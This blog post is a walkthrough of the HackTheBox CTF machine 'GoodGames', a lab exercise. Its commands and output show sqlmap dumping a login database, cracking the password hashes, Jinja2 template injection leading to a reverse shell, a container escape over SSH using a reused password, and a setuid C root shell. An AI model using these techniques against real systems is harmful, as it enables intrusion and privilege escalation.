---
layout: post
title: "HTB University CTF Writeups: GoodGames"
image: ''
date:   2021-11-21 12:00:00
tags:
- hackthebox
- red
- docker
- sql
- ssti
- htb-uni-ctf
- sqlmap
description: ''
categories:
published: true
comments: false
---

![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121130152.png)

## Intro
So I wasn't able to get Cyberforce writeups done this week, but I was able to participate in this year's HackTheBox University CTF. Since the rest of my team was busy with real-life stuff, I was on my own, but managed to get a spot in the top 100, which I'll take as a win. There were so many well designed challenges, and I'll be doing writeups on as many as I can (or at least just my favorites).

GoodGames was an easy rated machine because it tested your ability to apply basic vulnerabilities and use situational awareness to find the next step, as opposed to figuring out some complex chain of commands. I'll begin by walking the application, and finding SQL injection in the login page. From there, I'll extract some password hashes to get the admin's password and move into the admin panel, which is vulnerable to SSTI. We then find ourselves in a container, where one of the home directories on the original box is mounted. We can create a program to give us elevated privileges, then breakout of the container with ssh, and then escalate to root using our program.

* buh
{:toc}

## Recon
### nmap
Do I even need to say it at this point? Yes? Ok, **nmap**.
```bash
kali@transistor:~/ctf/htb_uni/GoodGames$ rustscan --ulimit 5000 -a 10.129.96.71 -- -sC -sV -oN scans/initscan.txt
...[trim]...
Nmap scan report for 10.129.229.71
Host is up, received syn-ack (0.059s latency).
Scanned at 2021-11-19 12:48:43 EST for 8s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48
|_http-title: GoodGames | Community and Store
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 19 12:48:51 2021 -- 1 IP address (1 host up) scanned in 14.46 seconds
```

It appears that only port 80 is open. This nmap scan actually tells us a good number of things even before we look at the box.
1. The hostname is `goodgames.htb`, so I'll add that to my `/etc/hosts` file in case there's additional vhosts
2. The website is built with Python. This eliminates a number of things to think about when going through the website (e.g. we can't use the pentestmonkey php reverse shell, LFI is not likely)
3. It's highly likely that we're working with a \*nix system because only 80 is open. Doing a `ping` will confirm this based on the ttl.

At this time, I also tried enumerating for additional virtual hosts/subdomains and couldn't find any given my usual wordlist.

### Walking the Website
When we first open the website, we're greeted with the following:
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121133106.png)

I guess the name makes sense. Wappalyzer also confirms some of our observations from earlier.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121133204.png)

I'll run `feroxbuster`, but I don't find anything of interest.

```bash
kali@transistor:~/ctf/htb_uni/GoodGames$ feroxbuster -u http://goodgames.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x conf,html,txt -t 32 -d 2

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://goodgames.htb
 🚀  Threads               │ 32
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [conf, html, txt]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      267l      553w     9294c http://10.129.229.199/login
200      267l      545w     9267c http://10.129.229.199/profile
302        4l       24w      208c http://10.129.229.199/logout
200      909l     2572w    44212c http://10.129.229.199/blog
200      728l     2070w    33387c http://10.129.229.199/signup
200     1735l     5548w    85107c http://10.129.229.199/
200      730l     2069w    32744c http://10.129.229.199/forgot-password
403        9l       28w      279c http://10.129.229.199/server-status
200      287l      620w    10524c http://10.129.229.199/coming-soon
...[closed prematurely for time]...
```

Many of the pages I found were pretty much useless. The `/coming-soon` and `/blog` pages had very little going on and were rabbit holes if you were extra stubborn. This also led me to looking into if this is a previously created template (because of how intrictate it is), which it is. 
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121135314.png)

This doesn't help that much, but I just wanted to point that out.

I'll make an account to see what else is going on, and I'll call it "ippsec" because maybe his energy will make me solve this box way faster. The profile page looks like this:
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121135747.png)

Again, there's really not much that immediately sticks out. 

## Shell as root in Container
### SQL Injection
I was stuck here for some time until I realized I needed to go around and actually start trying to break things so I could see weird behavior. I noticed that when you login, it takes you to a welcome page for an awkward amount of time, so I'll send my login request to Burp and see if I can do some basic SQL stuff.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121140357.png)

It worked! From here, there are two approaches you could take: (1) Do the whole SQL injection by hand, trying to find the table name and get the right output and everything, or (2) just use `sqlmap`.

Normally, I refrain from using `sqlmap` because it can blow up a system if not used responsibly, but because this was a time crunch, I have to make use of my resources as best as possible. The easiest way to use it here is to take the request, put it in a text file, and run the following command:
```bash
kali@transistor:~/ctf/htb_uni/GoodGames$ sqlmap -r request.txt --dump-all
```

The command can be a little finnicky at times, so playing around with the flags might be necessary (*read as: I didn't document what sqlmap command actually worked*). But, we're given a txt file of potential hashes, which are the actual hashes.

```bash
kali@transistor:~/ctf/htb_uni/GoodGames$ cat sqlmaphashes-f4qcmswb.txt 
2b22337f218b2d82dfc3b6f77e7cb8ec
7c6a180b36896a0a8c02787eeafb0e4c
```

We can then crack these hashes in [Crackstation](https://crackstation.net) to find the passwords "superadministrator" and "password1" respectively. The second password is what I used to register "ippsec", so "superadministrator" must be the admin password. I can use this to sign in as admin.

![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121141753.png)

### SSTI in Administrator Panel
Unlike before, there's a small gear at the top right. Clicking on it brings us here.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121141939.png)

I'll add this new subdomain to my `/etc/hosts` file and try again.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121142050.png)

We can login with the credentials we found earlier (admin:superadministrator) to get access to the admin panel.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121142144.png)

This part of the typical HTB challenge is always difficult because a lot of the functions here are absolutely useless. However, if there's one thing I know about CTF creators and Flask, they love putting in some kind of SSTI.

Server-side Template Injection (SSTI for short), is when a user is able to modify some parameter that can control the template engine that is running on the server. This can allow for XSS to RCE. The most common examples I've seen are in Jinja2 from Python and Pugify in Nodejs. There's a nice table to test certain payloads to enumerate the engine, but since we know it's Flask, we can reasonably assume it's Jinja, and can work from there.

If we go to the "My Profile" section, and test the "Full Name" field for SSTI, we get success.
![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121142528.png)

Normally, the process of exploiting SSTI to get code execution involves enumerating for a module that will give you that ability, and then inserting your payload. Luckily, the field we're exploiting allows us to input as much text as we want, so we can use the following payload that I picked up from 0xdf's blog a while ago.

![oof](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121151437.png)

<sub>The engine I use to render the markdown for the blog didn't like the syntax, but the payload is on 0xdf's Doctor writeup, and I think PayloadsAllTheThings as well</sub>

This will iterate over every possible module and check if we can get execution. If we can, we run the reverse shell payload. If we run this against the target, we get a shell back on our listener.

```bash
kali@transistor:~/ctf/htb_uni/GoodGames$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.96.71] 41246
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# id; hostname
id; hostname
uid=0(root) gid=0(root) groups=0(root)
3a453ab39d3d
```

## Shell as augustus
### user.txt
I'll start by stabilizing my shell using the python trick.
```bash
root@3a453ab39d3d:/backend# which python3
which python3
/usr/local/bin/python3
root@3a453ab39d3d:/backend# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# export TERM=xterm
export TERM=xterm
root@3a453ab39d3d:/backend# ^Z
[1]+  Stopped                 nc -lvnp 443
kali@transistor:~/ctf/htb_uni/GoodGames$ stty raw -echo; fg
nc -lvnp 443

root@3a453ab39d3d:/backend# 
```

It appears that we are root, but when we go to the `/root` directory, there is no flag. 
```bash
root@3a453ab39d3d:/backend# ls -la /root
total 20
drwx------ 1 root root 4096 Nov  5 15:28 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  5 15:28 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwx------ 3 root root 4096 Nov  5 15:23 .cache
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
```

In the home directory, we find the `augustus` user, and the user flag.
```bash
root@3a453ab39d3d:/backend# ls -la /home
total 12
drwxr-xr-x 1 root root 4096 Nov  5 15:23 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
drwxr-xr-x 2 1000 1000 4096 Nov  3 10:16 augustus
root@3a453ab39d3d:/backend# cd /home/augustus
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Nov  3 10:16 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 root 1000   32 Nov  3 10:13 user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```

But, if I read `/etc/passwd`, there is no `augustus` user, or frankly a user with the id of 1000.
```bash
root@3a453ab39d3d:/home/augustus# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

### Enumeration
I was stuck here for a long time. It was pretty easy to figure out that I was in a container given the hostname and the lack of processes when typing `ps aux`. I went through my notes on typical escape techniques, like shared namespaces, exposed sockets, etc, but nothing really applied to what was here. Linpeas didn't return much either. I then went to look for container enumeration scripts and found some, namely, [deepce](https://github.com/stealthcopter/deepce).

I'll transfer deepce to the container and see what I get back.
```bash
root@3a453ab39d3d:/home/augustus# ./deepce.sh 

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ 3a453ab39d3d
[+] Container Full ID ....... 3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.19.0.2 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.19.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 4.19.0-18-amd64
[+] Arch .................... x86_64
[+] CPU ..................... Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
/bin/hostname
/usr/local/bin/python
/usr/bin/python2
/usr/local/bin/python3
[+] Dangerous Capabilities .. Unknown (capsh not installed)
[+] SSHD Service ............ No
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/home/augustus /home/augustus rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
[+] Possible host usernames ... augustus rw,relatime - ext4  
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... No
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 4.0K
drwxr-xr-x 2 1000 1000 4.0K Nov 21 20:38 augustus
[+] Hashes in shadow file ............... No permissions
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

[+] Attempting ping sweep of 172.19.0.2 /24 (ping) 
172.19.0.2 is Up
172.19.0.1 is Up
==============================================================================================
```

From here, we conclude a couple of things. The reason that /home/augustus directory is there is because it's from the actual box, mounted inside the container. Additionally, there's nothing we can really exploit docker-wise. However, if we think about this in context, why would a user have their home directory mounted in the container?

### Breakout
The 172.19.0.0/24 subnet is used to make a virtual network for all of the containers on the machine. This means the 172.19.0.1 address refers to the actual box itself, because it's like the gateway. What if we can access the original box from the container via something like ssh?

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ hostname; id
GoodGames
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
```

## Shell as root
### root.txt
I noticed that the files that I originally transferred in augustus' directory were all completely owned by root. 
```bash
augustus@GoodGames:~$ ls -la
total 64
drwxr-xr-x 2 augustus augustus  4096 Nov 21 20:52 .
drwxr-xr-x 3 root     root      4096 Oct 19 12:16 ..
lrwxrwxrwx 1 root     root         9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus   220 Oct 19 12:16 .bash_logout
-rw-r--r-- 1 augustus augustus  3526 Oct 19 12:16 .bashrc
-rwxr-xr-x 1 root     root     38197 Nov 20 19:09 deepce.sh
-rw-r--r-- 1 augustus augustus   807 Oct 19 12:16 .profile
-rw-r----- 1 root     augustus    32 Nov  3 10:13 user.txt
```

If I put something like `bash` in the container, I could easily use that as augustus to give myself an elevated shell. Rather than struggle with kernel versions and all of that nonsense, I remembered I saw that `gcc` was in the container, so I compiled my own program.

```c
int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

```bash
root@3a453ab39d3d:/home/augustus# gcc shell.c -o shell -w
root@3a453ab39d3d:/home/augustus# chmod +s shell
```

Then, as augustus, I can execute the program, and grab the flag.
```bash
augustus@GoodGames:~$ ls -la
total 80
drwxr-xr-x 2 augustus augustus  4096 Nov 21 20:56 .
drwxr-xr-x 3 root     root      4096 Oct 19 12:16 ..
lrwxrwxrwx 1 root     root         9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus   220 Oct 19 12:16 .bash_logout
-rw-r--r-- 1 augustus augustus  3526 Oct 19 12:16 .bashrc
-rwxr-xr-x 1 root     root     38197 Nov 20 19:09 deepce.sh
-rw-r--r-- 1 augustus augustus   807 Oct 19 12:16 .profile
-rwsr-sr-x 1 root     root      8744 Nov 21 20:56 shell
-rw-r--r-- 1 root     root        71 Nov 20 20:34 shell.c
-rw-r----- 1 root     augustus    32 Nov  3 10:13 user.txt
augustus@GoodGames:~$ ./shell 
root@GoodGames:~# cat /root/root.txt
HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}
```
